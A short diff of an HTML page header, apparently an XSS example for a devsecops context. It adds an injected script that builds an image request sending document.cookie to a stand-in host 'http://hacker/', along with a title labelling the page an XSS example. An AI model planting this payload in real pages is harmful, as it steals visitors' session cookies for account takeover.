@@ -9,9 +9,9 @@
     <link rel="icon" href="../../favicon.ico">
   
    
-
+"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
     
-
+<title>Example document: XSS Doc</title>
 
     <title>Devsecops </title>
 
